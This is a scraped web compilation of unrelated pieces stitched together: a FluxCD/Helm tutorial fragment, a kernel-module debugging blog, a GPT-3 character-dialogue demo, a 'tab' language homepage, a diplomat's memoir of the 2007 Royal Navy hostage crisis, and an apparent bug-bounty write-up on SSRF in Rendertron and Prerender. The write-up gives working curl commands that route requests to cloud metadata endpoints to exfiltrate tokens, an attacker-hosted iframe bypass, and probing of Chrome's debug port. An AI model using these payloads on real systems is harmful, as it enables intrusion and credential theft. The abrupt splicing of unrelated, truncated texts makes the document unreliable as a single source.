<div><div><pre><code>flux-memcached-869757cb88-77br8 1/1 Running 0 100s
flux-59cb4447b9-thpr9 1/1 Running 0 101s
helm-operator-686dc669cd-g8kn7 1/1 Running 0 89s
</code></pre></div></div>

<p>Finally, you will need to give read and write access to your git repository to FluxCD.
To do this, <a href="https://docs.fluxcd.io/en/1.18.0/references/fluxctl.html">install fluxctl</a> and run:</p>
<div><div><pre><code>fluxctl identity <span>--k8s-fwd-ns</span> flux
</code></pre></div></div>
<p>This will print an RSA key that needs to be added as a deploy key to your repository.
For GitHub users, go to <code>https://github.com/YOURUSERNAME/YOURUSER/settings/keys/new</code> to add the key (tick the give write access checkbox).</p>

<p>Your release should start getting installed on your cluster soon.
You can check the state of your helm releases by running</p>

<p>If needed, you can check the FluxCD logs with</p>
<div><div><pre><code>kubectl <span>-n</span> flux logs deployment/flux <span>-f</span>
</code></pre></div></div>
<p>If you want to manually trigger FluxCD to re-read your git repository, use the command:</p>
<div><div><pre><code>fluxctl <span>sync</span> <span>--k8s-fwd-ns</span> flux
</code></pre></div></div>

</figure>



<p>Of course, you might not be able to do exactly what you want using the charts publicly available.
FluxCD allows you to add your charts directly through Git.</p>

<p>First, create a <code>charts</code> directory.
Inside this directory, run the following command to create a chart named <code>mychart</code>:</p>


<p>This will generate a sample chart defining everything that’s required to launch an Nginx server in production.
To run this chart, you will have to define a release for it in your <code>releases</code> folder:</p>

<div><div><pre><code><span>---</span>
<span>apiVersion</span><span>:</span> <span>helm.fluxcd.io/v1</span>
<span>kind</span><span>:</span> <span>HelmRelease</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>myrelease</span>
  <span>namespace</span><span>:</span> <span>default</span>
  <span>annotations</span><span>:</span>
    <span>fluxcd.io/automated</span><span>:</span> <span>"</span><span>false"</span>
    <span>fluxcd.io/tag.chart-image</span><span>:</span> <span>glob:3.1.1-debian-9-*</span>
<span>spec</span><span>:</span>
  <span>releaseName</span><span>:</span> <span>myrelease</span>
  <span>chart</span><span>:</span>
    <span>git</span><span>:</span> <span>ssh://git@github.com/[USER]/[REPO]</span>
    <span>ref</span><span>:</span> <span>[</span><span>BRANCH</span><span>]</span>
    <span>path</span><span>:</span> <span>charts/mychart</span>
  <span>values</span><span>:</span>
    <span>ingress</span><span>:</span>
      <span>enabled</span><span>:</span> <span>true</span>
      <span>hosts</span><span>:</span>
        <span>-</span> <span>host</span><span>:</span> <span>YOUR.OTHER.DOMAIN</span>
          <span>paths</span><span>:</span> <span>[</span><span>"</span><span>/"</span><span>]</span>
</code></pre></div></div>

<p>Like in the previous example, don’t forget to <code>git commit</code> and <code>git push</code>.
FluxCD will automatically create the new release and you will see a magnificent Nginx welcome page appear at the specified domain.</p>

<p>To be able to display something else than the Nginx welcome page, we will give it a configuration file.
For this purpose, you can define a <a href="https://kubernetes.io/docs/concepts/configuration/configmap/">configmap</a> in <code>charts/mychart/templates/configmap.yaml</code>.
The following config will redirect every request to a URL of our choice:</p>

<div><div><pre><code><span>apiVersion</span><span>:</span> <span>v1</span>
<span>kind</span><span>:</span> <span>ConfigMap</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>nginx-conf</span>
<span>data</span><span>:</span>
  <span>nginx.conf</span><span>:</span> <span>|</span>
    <span>events {</span>
      <span>worker_connections  1024;</span>
    <span>}</span>
    <span>http {</span>
      <span>server {</span>
          <span>listen 80 default_server;</span>
          <span>return 301 {{ .Values.redirect }};</span>
      <span>}</span>
    <span>}</span>
</code></pre></div></div>

<p>You will then need to declare the volume by adding this value to <code>spec.template.spec</code> in <code>charts/mychart/templates/deployment.yaml</code>:</p>

<div><div><pre><code>      <span>volumes</span><span>:</span>
      <span>-</span> <span>name</span><span>:</span> <span>nginx-conf</span>
        <span>configMap</span><span>:</span>
          <span>name</span><span>:</span> <span>nginx-conf</span>
</code></pre></div></div>

<p>To mount the configuration file into the Nginx container, you need to add the following lines to <code>spec.template.spec.containers[0]</code> in the same file:</p>
<div><div><pre><code>          <span>volumeMounts</span><span>:</span>
          <span>-</span> <span>mountPath</span><span>:</span> <span>/etc/nginx/</span>
            <span>readOnly</span><span>:</span> <span>true</span>
            <span>name</span><span>:</span> <span>nginx-conf</span>
</code></pre></div></div>

<p>Finally, bump the <code>version</code> in <code>charts/mychart/Chart.yaml</code>, and set the redirect URL in <code>releases/myrelease.yaml</code> by editing the values section like this:</p>
<div><div><pre><code>  <span>values</span><span>:</span>
    <span>ingress</span><span>:</span>
      <span>enabled</span><span>:</span> <span>true</span>
      <span>hosts</span><span>:</span>
        <span>-</span> <span>host</span><span>:</span> <span>YOUR.OTHER.DOMAIN</span>
          <span>paths</span><span>:</span> <span>[</span><span>"</span><span>/"</span><span>]</span>
    <span>redirect</span><span>:</span> <span>"</span><span>https://www.youtube.com/watch?v=cFVF26XPcAU"</span>
</code></pre></div></div>



<p>As this article only really scratches the surface of what Helm and FluxCD can do,
I recommend you to also check out <a href="https://toolkit.fluxcd.io/">the official FluxCD docs</a> and their <a href="https://github.com/fluxcd/flux-get-started">example repository</a>,
as well as the <a href="https://helm.sh/docs/chart_template_guide/">Helm Chart Template Developer’s Guide</a>.</p>

<p>This post is about perils of concurrency and race conditions.  My code was
nearly correct, but ultimately, there were two major synchronization bugs that
killed it.</p>

<p>In this post, I assume you have some understanding of how files and concurrency
work on Unix systems. I will try to explain everything else!</p>

<h2 id="a-nightmare-begins">A nightmare begins</h2>

<p>I have been working on building a <a href="https://reberhardt.com/blog/2019/12/12/generating-diagrams-for-teaching-multiprocessing.html">graphical debugger for C Playground</a> for
some time, allowing users to run code in the browser and visualize how their
program is being executed. As part of this work, I had to implement a kernel
module. (I’ll explain more about this project in the next section.) After
testing the code locally for a few months, I pushed it to production.</p>

<p>The next morning, I woke up to a text from my roommate: <em>“I think the server
crashed.”</em> Uh oh, that’s not supposed to happen. I quickly pulled out my laptop
and tried to SSH into the server to pull the logs, but to my surprise, I
couldn’t reach the server:</p>

<div><div><pre><code>ssh: connect to ... port 22: Operation timed out
</code></pre></div></div>

<p>Something wasn’t right. I logged into DigitalOcean to restart the machine, but
while I was doing that, I noticed a spike in the server’s CPU usage graph
around the time my roommate texted me. The CPU was cleanly pegged at 100%.
Normally, if a process running on the machine is hogging the CPU, we should
expect to see slight fluctuations around 100%, but that was not the case here
– it was a clean, horizontal line.</p>

        <img src="https://reberhardt.com/blog//images/my-first-kernel-module/digitalocean-cpu-usage.png" alt="">
    </a>
    
</figure>

<p>After force-restarting the server via DigitalOcean and rolling back the
debugging feature, I started going through logs to get a sense for what
happened. My kernel module has print statements, and these get saved to the
kernel’s log in <code>/var/log/kern.log</code>. I scanned through this file, hoping to
find some clues, but this only confused me even more; there was <em>nothing</em> in
the kernel logs from any time near when the server locked up. It seemed to
suggest my kernel module wasn’t even running at that time. But I felt it <em>had</em>
to be a problem with my kernel module: nothing in user space could cause a
computer to lock up the way it did, completely unresponsive and pegged at 100%
CPU.</p>

<p>I kept digging. If the kernel logs didn’t give me anything helpful, maybe there
might be some application-side records that would indicate what happened.
However, when I checked the C Playground log file, I felt things only getting
worse:</p>

<p>What on earth is <em>that</em>???</p>

<p>After some Googling, I figured out that <code>^@</code> is how <code>less</code> displays null bytes.
So, my log file is filled with null bytes. Why would that be?</p>

<p>Then it occurred to me: Filesystem writes aren’t synchronous. When a program
writes to a file, the data is usually not immediately written to disk. Instead,
to improve performance, the data is written to a buffer in memory. Normally,
the kernel flushes this buffer to disk periodically, so that the data is
persisted. But if the kernel is incapacitated, there is no way the data can
reach the disk, and when the machine force-restarts, it is lost forever. From
the above output, I could see that parts of the logs made it to disk, but later
parts of the logs were not so lucky, appearing as scrambled null bytes instead.</p>

<p>I started to feel a sense of dread creeping in. This was reminding me of the
extremely late nights and brain-frying debugging sessions from that time I took
an operating systems class. Except this might be even worse: This problem is
<em>only</em> happening in production, and I can’t reproduce it, and I can’t get any
logs to explain what’s wrong.</p>

<p>In the next section, I’ll explain what my kernel module was doing, so that you
can follow along with my debugging process. Then, in the last section, I’ll
talk you through the long, long process I went through to identify the <em>two</em>
bugs that caused this problem. (Spoiler alert: there were two race conditions
that caused two use-after-frees, in which I attempted to use memory after it
had already been freed.)</p>

<h2 id="context-c-playground-visual-debugger">Context: C Playground Visual Debugger</h2>

<p>I have been working on <a href="https://cplayground.com/">C Playground</a> for some time,
which is an online sandbox for quickly testing out C and C++ code. It is
specifically designed for learning systems programming, and I have been working
on features that generate diagrams to illustrate what is happening under the
hood when you run code on a computer.</p>

<p>Most recently, I was working on generating diagrams of the data structures that
the kernel uses to keep track of a program’s open files. The context and
motivation for this are described in much more detail in <a href="https://reberhardt.com/blog/2019/12/12/generating-diagrams-for-teaching-multiprocessing.html">this blog
post</a>.
As a very brief summary, this feature aims to help students understand system
calls such as <code>open</code>, <code>close</code>, <code>dup2</code>, <code>fork</code>, <code>pipe</code>, and others. Using these
system calls requires an understanding of what they are doing on your behalf.
Usually, we explain these system calls in terms of the <em>vnode table</em>, which
caches information about files on the system, the <em>open file table</em>, which
stores <em>session</em> information (e.g. program X has file Y open for reading, and
has read 100 bytes so far), and the <em>file descriptor table</em>, which stores
pointers into the open file table indicating which sessions a process has open.</p>

<p>When teaching these concepts, we typically draw a lot of diagrams by hand. C
Playground aims to generate diagrams automatically, helping students to build
up and confirm their intuitions without needing access to a TA. The platform
allows students to set breakpoints and step through …</p></div></article></div></div></div>

There, the relationship is a transactional one with the AI only focused on solving an immediate request from you. Very little context is carried between interactions so they have no emotional intelligence, making them frustrating to interact with. Instead, we humans should be better represented within an AI’s brain. It should have memories of us and our conversations and continue that shared context into future conversations. It should anticipate us instead of just reacting to us.

To demonstrate how far we’ve come toward accomplishing our goal of AI-driven storytelling and emotional intelligence, we created this scene of our character Lucy in conversation with a Guest. GPT-3, OpenAI’s powerful Transformer NLP model that’s been trained on a large corpus of text, is generating almost all of the things said in this video. Essentially, we give the AI some context, and it attempts to complete the text in an intelligent way. It shows how close we are to having natural conversations with an AI that really sees us as individual emotional beings and not task masters by leveraging humans to help guide and train it.</p><p>In an effort to inspire others and move the field forward, let me share some of how we’re doing this on the technology side. Below is a significant subset of the exact context that we gave GPT-3 in the making of this scene. We simply tell it about how we want the conversation to proceed as well as some details about who Lucy and the Guest are so it can generate new dialogue lines with that context.</p><p>CONTEXTS:</p><ul data-rte-list="default"><li><p>The following is a conversation between Lucy and Guest over text messages.</p></li><li><p>In Lucy's world, which is different from the Guest's, the date is 1988, while for the Guest it is still 2020.</p></li><li><p>The Guest reaches out to Lucy over chat message and Lucy responds in a playful way, asking if the Guest is a foozle and comes in peace.</p></li><li><p>Lucy says she can never sleep when the full moon is out, so she's awake now and passing the time by looking out the window for shooting stars.</p></li><li><p>Lucy continues to get to know the guest, asking them lots of personal questions and being imaginative.</p></li><li><p>Lucy eventually asks if the Guest has ever seen a shooting star and what the Guest wished for.</p></li><li><p>Finally, Lucy sees the shooting star, makes her wish, which she keeps as a secret or it won't come true, and then says goodnight.</p></li></ul><p>&nbsp;&nbsp;LUCY:</p><ul data-rte-list="default"><li><p>Little Girl.</p></li><li><p>Active Imagination.</p></li><li><p>Age 8.</p></li><li><p>Lives with Brother, Mom, and Dad.</p></li><li><p>Likes Mysteries, Science, and Drawing.</p></li><li><p>Is looking for a shooting star.</p></li><li><p>Is superstitious and likes horoscopes.</p></li><li><p>Is a daydreamer.</p></li></ul><p>GUEST:</p><ul data-rte-list="default"><li><p>A curious and friendly person who was just introduced to Lucy.</p></li></ul></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1605574654634_5617"><div>

In the video above, we wrote the Guest saying, “Hi Lucy” and Lucy’s response, “Oh, a message. You must be a foozle!” The rest of the lines are then generated by GPT-3 -- with one exception: We wrote “I can’t sleep when there is a full moon, so I’m downstairs practicing for computer class tomorrow,” but all other lines were generated by GPT-3 based simply on the context and lines provided using a tool we will talk about in a follow up post.</p><p>Once the dialogue is selected, it’s sent through a TTS [Text-To-Speech] processor similar to the ones generating your turn-by-turn directions but much more advanced. We’ve trained a custom model on many samples of Lucy’s voice so that we can generate ad hoc lines for her, almost instantaneously. That audio is then fed into another model which converts her speech into lip sync and appropriate face animation. We added some tweaks to her head and eye movement, but most of this performance was completely automated without the need for custom animation.</p><p><br>This video is a demonstration of the powerful narratives that can emerge when you combine an artist’s vision, Artificial Intelligence, and emotional intelligence.

<ul>
<li>Dynamic rendering is a technique used to serve prerendered web site pages to crawlers (e.g., Google search engine, Slack or Twitter bots, etc.)</li>
<li>The most popular open source applications for dynamic rendering are Rendertron and Prerender; both of which may introduce vulnerabilities to a network if used improperly.</li>
<li>I used a vulnerability in Rendertron to take over a production web application and earn $5,000 through a bug bounty program.</li>
</ul>
<h2>Introduction</h2>
<p>Modern JavaScript frameworks are heavily utilized for web site development nowadays.
Instead of plain HTML pages, we now have PWAs (progressive web applications) and SPAs (single page applications) that do most of the work in the client's browser and use JavaScript to generate the contents of the page on the fly.</p>
<p>This technology has many advantages and can be effective at creating a sleek UI and UX, but at the same time, it is not <a href="https://en.wikipedia.org/wiki/Search_engine_optimization" target="_blank" rel="noopener">SEO</a> friendly, because crawlers and bots are not developed to render or understand JavaScript. One of the common ways to help bots get valid HTML content is to open a requested page in a headless browser instance on the server, such as <a href="https://pptr.dev/" target="_blank" rel="noopener">Puppeteer</a> or <a href="https://github.com/microsoft/playwright" target="_blank" rel="noopener">Playwright</a>, get the resulting HTML, strip parts that are not intended to be crawled and return it. This approach is called dynamic rendering and is promoted by <a href="https://developers.google.com/search/docs/guides/dynamic-rendering" target="_blank" rel="noopener">Google</a> as one of the possible ways to serve content.</p>

<p>I came across this type of application while doing a security review of packages in the Node.js ecosystem on possible vulnerabilities that may appear when utilizing headless browsers in production. I wrote Semgrep rules and ran them at scale to detect possible vulnerable uses of headless browsers. </p>
<blockquote>
<p>The rules are available in a Semgrep pack here: <a href="https://semgrep.dev/p/headless-browser" target="_blank" rel="noopener">https://semgrep.dev/p/headless-browser</a></p>
</blockquote>
<p>These Semgrep rules produced many results to triage and after investigating them I found out that a significant number of modules that use headless browsers are intended to help webmasters with dynamic rendering.</p>
<p>Due to the growing popularity of this concept, I believe it is important to investigate and understand what can go wrong while using dynamic rendering in production.</p>
<p>The scope of this research includes the two most popular open-source dynamic rendering applications, <a href="https://github.com/GoogleChrome/rendertron" target="_blank" rel="noopener">Rendertron</a> and <a href="https://github.com/prerender/prerender" target="_blank" rel="noopener">Prerender</a>, but the described attacks may be applied to other applications of this type as well. I'll also share how I was able to apply this knowledge to take over a production web server with a few curl requests and earn a $5,000 bug bounty.</p>
<h2>Architecture</h2>
<p>If a web page is generated dynamically on the client but needs to be properly indexed by search engines, a common approach is to catch a request from the crawler or bot, render it server-side, and output the pretty HTML with all the content. That flow generally looks like this:</p>

<li>The web server detects crawlers by checking the User-Agent header (or URL query in some cases).</li>
<li>Requests are routed to the rendering application.</li>
<li>The rendering application runs a headless browser and opens the original requested URL, which will render the page as if viewed by a user with a browser.</li>
<li>The resulting HTML is stripped of <code>&lt;script&gt;</code> tags and returned to the web server.</li>
<li>The web server returns the dynamically rendered page to the crawler.</li>
</ol>
<h2>How to identify a dynamic rendering application</h2>
<p>First of all, dynamic rendering is intended to be used with web pages that need to be indexed properly, so they are publicly available by definition. On top of that, prerendering makes sense only if most of the content on the page is generated by JavaScript (usually with a JS framework like React, Angular, Vue, etc.) and created dynamically at the same time. Some examples include: the main page of a news website that updates in real-time or an online store page with a list of the most popular products.</p>
<p>When a candidate site is found, you can identify if dynamic rendering is possible by sending multiple requests to the same page but with different User-Agent headers (remember, dynamic rendering tries to render pages for crawlers):</p>
<div data-language="bash"><pre><code>
<span>curl</span> -v -A <span>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"</span> https://shop.polymer-project.org/</code></pre></div>
<div data-language="bash"><pre><code>
<span>curl</span> -v -A <span>"Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"</span> https://shop.polymer-project.org/</code></pre></div>
<p>If the curl results are different and the response for the fake crawler request has pretty HTML without any <code>&lt;script&gt;</code> tags, it means that the website is using dynamic rendering.</p>
<p>You can test this with <a href="https://shop.polymer-project.org/" target="_blank" rel="noopener">https://shop.polymer-project.org/</a> as an example — it is a demo site for demonstrating dynamic rendering.</p>

    </span></p>
<p>If you want to see how each app responds to various User-Agent headers, you can check out the code itself:</p>
<p><a href="https://github.com/prerender/prerender-node/blob/f9c5e12b0e271ded3e3cb6c70b703485280ec9d6/index.js#L37" target="_blank" rel="noopener">https://github.com/prerender/prerender-node/blob/f9c5e12b0e271ded3e3cb6c70b703485280ec9d6/index.js#L37</a></p>
<p><a href="https://github.com/GoogleChrome/rendertron/blob/a1dd3ab1f054bc19e89dcdecdb71dc004f7d068e/middleware/src/middleware.ts#L24" target="_blank" rel="noopener">https://github.com/GoogleChrome/rendertron/blob/a1dd3ab1f054bc19e89dcdecdb71dc004f7d068e/middleware/src/middleware.ts#L24</a></p>
<p>In addition, Rendertron will return the following header: <code>X-Renderer: Rendertron</code>. Prerender has an option for adding an <code>X-Prerender: 1</code> header, but it is not default behavior.</p>
<p>Lastly, both Rendertron and Prerenderer parse specific meta tags in order to change response headers or HTTP status codes. In other words, it gives developers the opportunity to manipulate rendering results by leaving meta tags in the source code of the page. These can also be used to identify a dynamic rendering application.</p>
<p>For Prerender they look like this:</p>
<div data-language="php"><pre><code><span>&lt;</span>meta name<span>=</span><span>"prerender-status-code"</span> content<span>=</span><span>"302"</span> <span>/</span><span>&gt;</span>
<span>&lt;</span>meta name<span>=</span><span>"prerender-header"</span> content<span>=</span><span>"Location: https://www.google.com"</span> <span>/</span><span>&gt;</span></code></pre></div>
<p>For Rendertron:</p>
<div data-language="php"><pre><code><span>&lt;</span>meta name<span>=</span><span>"render:status_code"</span> content<span>=</span><span>"404"</span> <span>/</span><span>&gt;</span></code></pre></div>
<h2>Easy SSRF</h2>
<p>It’s easy to take advantage of a dynamic rendering app when it is publicly available because it allows you to interact with the app directly and send arbitrary requests, including to local endpoints. There are some restrictions for accessing local infrastructure, but depending on the version of the dynamic rendering app, they can be bypassed.</p>
<h3>Rendertron</h3>
<p>Rendertron is quite easy to identify because it has a web frontend that allows you to send requests and take screenshots of the requested page.</p>

<ul>
<li>Version 3.1.0 has allow-listing option to restrict rendering to a given list of domains or URL patterns (but it needs to be configured:))</li>
<li>Version 3.0.0 blocks any requests to Google Cloud—however, this can bypassed by requesting metadata endpoints inside an iFrame. This restriction does not apply to other cloud providers (AWS, DigitalOcean, etc.) and are still a danger!</li>
<li>Older versions block requests to Google Cloud but allow requests to its beta version <code>http://metadata.google.internal/computeMetadata/v1beta1/</code> (deprecated since September 30)</li>
<li>Version 1.1.1 and older allow all kinds of requests</li>
</ul>
<p>Rendertron’s API (from the docs):</p>
<p><strong>GET /render/:url</strong><br>
The render endpoint will render and serialize your page.</p>
<p><strong>GET /screenshot/:url</strong><br>
<strong>POST /screenshot/:url</strong><br>
The screenshot endpoint takes a screenshot of your page (as an image).</p>
<p>Additional options are available as a JSON string in the POST body. See <a href="https://github.com/GoogleChrome/puppeteer/blob/v1.6.0/docs/api.md#pagescreenshotoptions" target="_blank" rel="noopener">Puppeteer documentation</a> for available options. You cannot specify the type (defaults to jpeg) and encoding (defaults to binary) parameters.</p>
<p>So, when you stumble upon a Rendertron instance, it is worth trying to perform a SSRF attack and exfiltrate cloud tokens like this:</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</code></pre></div>
<p>or,</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://169.254.169.254/latest/meta-data/</code></pre></div>
<p>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener">This is a great resource</a> for SSRF payloads.)</p>
<p>If requests are blocked, there is still a chance to force the headless browser to fetch an iFrame and output a screenshot of the metadata endpoint by sending requests to /screenshot and forcing the server to visit a website you control:</p>
<!-- markdown-link-check-disable -->
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://www.attackers-website.here/iframe-example</code></pre></div>
<!-- markdown-link-check-enable -->
<p>The HTML at www.attackers-website.here includes an iFrame with the metadata endpoint. This forces Rendertron to fetch the attacker HTML and render the page on its own server. This means that the iFrame will also be resolved on its own server.</p>
<div data-language="php"><pre><code><span>&lt;</span>html<span>&gt;</span>
  <span>&lt;</span>head<span>&gt;</span>
    <span>&lt;</span>meta content<span>=</span><span>"text/html; charset=utf-8"</span> http<span>-</span>equiv<span>=</span><span>"Content-Type"</span> <span>/</span><span>&gt;</span>
  <span>&lt;</span><span>/</span>head<span>&gt;</span>

<p>Prerender does not have a GUI frontend and is not as easy to identify. Worse, requests to / return 400 without any interesting headers:</p>

<strong>POST /render?url=:url</strong></p>
<p>list of options can be found in the <a href="https://github.com/prerender/prerender#url" target="_blank" rel="noopener">docs</a>, main takeaways:</p>
<ul>
<li>Prerender is also able to a create screenshots</li>
<li><code>followRedirects</code> (false by default) follow 301 redirects if true</li>
</ul>
<p>The only way to identify if an application is using Prerender is to send a request like <code>/render?url=http://www.example.com</code> and check the output. Prerender does not have any built-in protection from cloud data exfiltration but does allow users to configure blacklists and whitelists, so depending on its configuration, chances are that it may be possible to request cloud tokens like</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render?url<span>=</span>http://169.254.169.254/latest/meta-data/</code></pre></div>
<p>On top of that, Prerender connects to headless Chrome through the debug interface, which opens on the hardcoded port 9222.</p>
<p>So if local requests are allowed, it’s possible to figure out the Chrome debug ID</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render?url<span>=</span>http://localhost:9222/json/</code></pre></div>

    This is the homepage for <code>tab</code>, a kind of programming language/shell calculator.

    
    Because <code>tab</code> is a special programming language unlike any other:
    <ul>
      <li>It's statically-typed and type-infered.</li>
      <li>It also infers memory consumption and guarantees O(n) memory use.</li>
      <li>It is designed for concise one-liner computations right in the shell prompt.</li>
      <li>It features both a mathematics library and a set of data slicing and aggregation primitives.</li>
      <li>It is faster than all other interpreted languages with a similar scope. (Perl, Python, awk, ...)</li>
      <li>It is not Turing-complete. (But can compute virtually anything nonetheless.)</li>
      <li>It is self-contained: distributed as a single statically linked binary and nothing else.</li>
      <li>It has no platform dependencies.</li>
    </ul>

    You can think of <code>tab</code> as a kind of general-purpose query language for text files.

    

    Clone the <a href="http://bitbucket.org/tkatchev/tab">git respository</a> or download a statically-linked binary for <a href="http://bitbucket.org/tkatchev/tab/downloads/tab-linux-x86_64">x86_64 Linux</a>.

        <dt>2019-10-04</dt>
        <dd>Version 7.2 released. Changes:
            <ul>
                <li>Added the <code>product</code>, <code>mul</code> and <code>add</code> functions.</li>
                <li>Added the <code>until</code> function.</li>
                <li>Improved error output when an unknown function is called.</li>
            </ul>
        </dd>

        <dt>2019-06-20</dt>
        <dd>Verson 7.1 released. Changes:
            <ul>
                <li>Changed the sematics for <code>array</code>, <code>iarray</code> and <code>sort</code> functions when several arguments are passed; each argument is treated like an individual array member. This is a more 'natural' behaviour, but potentially <b>code-breaking</b>.<br>
                    (That is, <code>sort(4, 1, 3, 2)</code> is now equivalent to <code>sort.seq(4, 1, 3, 2)</code>.)
                </li>
                <li>Added the <code>sorted</code> function to mimic the old behaviour of <code>sort</code>; with multiple arguments an array of one element (a tuple of input arguments) is returned.<br>
                    The function <code>sorted</code> is meant for use as an aggregator in a map.
                </li>
                <li>Added the <code>combo</code> function.</li>
            </ul>

        <dd>Version 7.0 released. Changes:
            <ul>
                <li>Added the pipe operator: <code>..</code>. The code <code>a .. b</code> is equivalent to <code>@=a, b</code>.</li>
                <li>Changed precendence for function calls with <code>f.x</code> syntax. From now on, <code>f.x == b</code> is parsed as <code>(f.x) == b</code>. Potentially <b>code-breaking</b> change.</li>
		<li>Fixed errors and crashes when an expression has no value. E.g., <code>[@ : a=0]</code>.</li>
                <li>The <code>sample</code> function will now accept arbitrary objects, not just arrays of atomic values.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><strong>Royal Navy Hostages In Iran</strong>– <strong>What Really Happened</strong> is an event that at the time in 2007 was global news. From my perspective as Her Majesty’s Consul to Iran at the time, it was a hopelessly frustrating and humiliating experience. As a proud maritime nation, it was also not exactly one of our finest moments.</p><p>Now I had a saying at the time that whenever the Iranians got twitchy or felt threatened, they would take hostages. They had form for this and in this case they didn’t let me down.</p><p>In fact this 2007 incident was not the first time they had detained British military personnel.</p><p>In June 2004, three small vessels and eight<strong> Royal Navy</strong> personnel were detained by Iranian forces after they allegedly entered Iranian waters on the Shatt al-Arab river without permission. At the time, the story was broken when the capture was announced on state-run Iranian television. British officials only stated that they had “lost contact” with the boats, before confirming their detention.</p><p>On that occasion the men were later released unharmed, but only after being paraded blindfolded on Iranian TV and made to apologise for their role in the incident. The equipment was not returned.</p><p>So now fast forward to Friday March 23rd 2007:</p><p>Fifteen British Royal Navy and Royal Marine personnel were captured by Iranian authorities, more specifically the Iranian Revolutionary Guard Corps (IRGC) at gunpoint in the Persian Gulf just off the Iraqi coast that morning.</p><p>The Royal Navy insisted that they were operating legitimately in Iraqi waters the Iranians said they were in fact in Iranian waters. This inside/outside argument went on for the duration and long after the crisis with both sides providing information showing they were in the right.</p><p>Geographically, the incident occurred near the Shatt al-Arab (Arvandrud) waterway, which forms the southern border between Iran and Iraq. Territorial and navigational control over the waterway has been a constant source of friction between the two countries that helped to spark the Iran-Iraq war in the 1980s.</p><p>What is not disputed is the fact that the sailors and marines, from the Type 22 frigate HMS <i>Cornwall</i>, had been inspecting, in accordance with UN Security Council Resolution 1723, a ship that was believed to be smuggling cars into Iraq, though it was subsequently cleared by the boarding team after inspection.</p><p>The Ministry of Defence reiterated this by putting out a bulletin late in the day stating that the Royal Navy personnel had been <i>“engaged in routine boarding operations of merchant shipping in Iraqi territorial waters”</i> and had finished their search of the suspect vessel when they were surrounded by Iranian forces and taken into captivity</p><p>My first inkling of this event was seeing it at home on Iranian TV that same evening!</p><p>Needless to say my phone started ringing and I was summoned to the embassy for a crisis meet with the Ambassador and other colleagues from the political and public affairs sections.</p><p>Bottom line, get hold of the Iranian officials at their Foreign Ministry and find out exactly what was going on and request access to the captured personnel. While I would be doing this, the Ambassador would be talking to the powers that be in London.</p><p>Now, I should have been granted access to the hostages under the terms of Article 36 of the Vienna Convention on Consular Relations, to which 170 nations are party which ” <em><strong>requires a nation arresting or detaining a foreign national to afford the detainee access to his or her consulate and to notify the foreign national of the right of consular access”</strong></em></p><p>In this case, Iran (which was a signatory) completely ignored the Convention. I was denied access despite repeated requests and it was not until the day of their release that I finally got to meet up with the sailors and marines at Tehran airport.</p><p>Several fruitless meetings at the Ministry of Foreign Affairs got me nowhere. They were not listening. At one stage I even showed them my warrant set out on parchment and signed personally by the Queen appointing me as Her Majesty’s Consul to Iran promising to protect the rights of British citizens in Iran. No reaction at all from the officials.</p><p>Because of this, the situation very quickly escalated upwards to levels way above my pay grade, and it fell to the Ambassador to quite rightly now take the lead on this.</p><p>From that point onwards, the whole sorry saga then slowly dragged on. It was humiliating to see the hostages paraded on Iranian TV almost every night. The Iranians were pulling out all their propaganda tools. The hostages were being shown happily playing board games, having slap up meals and on a couple of occasions one of them would be standing in front of a map of the disputed waterway explaining how they had intruded into Iranian waters.</p><p>If this was not bad enough, we than had to deal with the usual regime sponsored Basij rentamob being whipped up into a frenzy and stoning the embassy on the 1st April demanding that the hostages be put on trial.</p><p>Meanwhile, the Ambassador was doing his level best to gain some traction with the Iranians and I was left to deal with the foreign press who had flooded into Tehran to cover the story. Quite frankly, they would have been better off staying in London where this whole event was now being played out at Ministerial and Prime Minister/Presidential level.</p><p>I had nothing to tell them of any relevance or substance and they soon got bored with me.</p><p>Then, out of the blue Iran’s President Ahmadinejad on 4th April held a press conference to announce the release of the captives as a “gift” to the British people. They would be released the following day. At last!</p><p>Time to put repatriation logistics in place.</p><p>Fortunately, London had also got its act together and had chartered a British Airways plane to bring them back to the UK. I also learnt that the plane would also be bringing back a large number of the British media who had been encamped in Tehran for the story.</p><p>Therefore, it was decided that I and two of my colleagues from the embassy would escort the freed hostages back to the UK. My primary task was to keep the journalists at bay and away from them on the plane as obviously they needed to be debriefed officially back in the UK first.</p><p>The next day, we drove to Tehran airport and it was here that I finally got to meet the now freed hostages. They were decked out in shiny new suits (apart from the only female) and all clutching plastic carrier bags full of Iranian goodies….pistachio nuts, CD’s, Persian candles, books and a host of other Iranian treats.</p><div id="gallery-1"><figure><p><a href="https://www.mydiplomaticlife.com/mydiplomaticlifethetruestories/images-2/#main"><img width="510" height="286" src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/09/images-2.jpg?fit=510%2C286&amp;ssl=1&amp;is-pending-load=1" alt="Iran" aria-describedby="gallery-1-1391" data-lazy-srcset="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/09/images-2.jpg?w=510&amp;ssl=1 510w, https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/09/images-2.jpg?resize=300%2C168&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/09/images-2.jpg?fit=510%2C286&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-1-1391"> RN hostages just after release in 